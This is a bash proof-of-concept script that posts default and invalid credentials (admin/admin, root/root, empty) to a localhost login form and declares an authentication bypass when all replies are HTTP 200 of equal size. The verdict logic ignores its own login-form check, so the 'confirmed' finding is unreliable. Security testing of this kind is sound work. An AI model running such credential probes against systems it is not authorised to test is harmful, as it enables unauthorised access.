#!/bin/bash

# POC: Authentication Validation Bypass - All Credentials Accepted
# This script demonstrates that http://localhost/ accepts ANY credentials
# and returns HTTP 200 without performing credential validation

TARGET="http://localhost/"

echo "[*] Testing Authentication Validation Bypass"
echo "[*] Target: $TARGET"
echo ""

# Arrays to store results
declare -a http_codes
declare -a response_sizes
declare -a test_names

# Function to test credentials
test_credentials() {
    local username=$1
    local password=$2
    local description=$3
    local index=$4
    
    echo "[*] Test $index: $description"
    echo "    Credentials: username='$username' password='$password'"
    
    # Make the POST request
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" \
        -d "username=$username&password=$password" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -n 1)
    # Extract body (all lines except last)
    body=$(echo "$response" | sed '$d')
    
    # Get response size
    response_size=$(echo "$body" | wc -c)
    
    # Store results
    http_codes[$index]=$http_code
    response_sizes[$index]=$response_size
    test_names[$index]="$description"
    
    echo "    HTTP Status: $http_code"
    echo "    Response Size: $response_size bytes"
    
    # Check if login form is present
    if echo "$body" | grep -q 'form.*action'; then
        echo "    Login Form Present: YES"
    else
        echo "    Login Form Present: NO"
    fi
    
    # Check for error messages
    if echo "$body" | grep -qi "invalid\|failed\|error\|unauthorized"; then
        echo "    Error Messages: YES"
    else
        echo "    Error Messages: NO"
    fi
    
    echo ""
}

# Run tests
test_credentials "admin" "admin" "Valid-looking admin credentials" 0
test_credentials "root" "root" "Valid-looking root credentials" 1
test_credentials "invalid" "wrong" "Clearly invalid credentials" 2
test_credentials "nonexistent123" "badpass" "Non-existent user" 3
test_credentials "" "" "Empty credentials" 4

echo "[*] Summary:"
echo "================================"

# Check if all HTTP codes are 200
all_200=true
for code in "${http_codes[@]}"; do
    if [ "$code" != "200" ]; then
        all_200=false
        break
    fi
done

# Check if all response sizes are identical
all_same_size=true
first_size=${response_sizes[0]}
for size in "${response_sizes[@]}"; do
    if [ "$size" != "$first_size" ]; then
        all_same_size=false
        break
    fi
done

echo "All HTTP Codes 200: $all_200"
echo "All Response Sizes Identical: $all_same_size"
echo "Response Size: ${response_sizes[0]} bytes"
echo ""

if [ "$all_200" = true ] && [ "$all_same_size" = true ]; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] The application accepts ALL credentials without validation"
    echo "[+] All test cases returned HTTP 200 with identical response"
    echo "[+] No credential validation mechanism is in place"
    exit 0
else
    echo "[-] Vulnerability not confirmed"
    exit 1
fi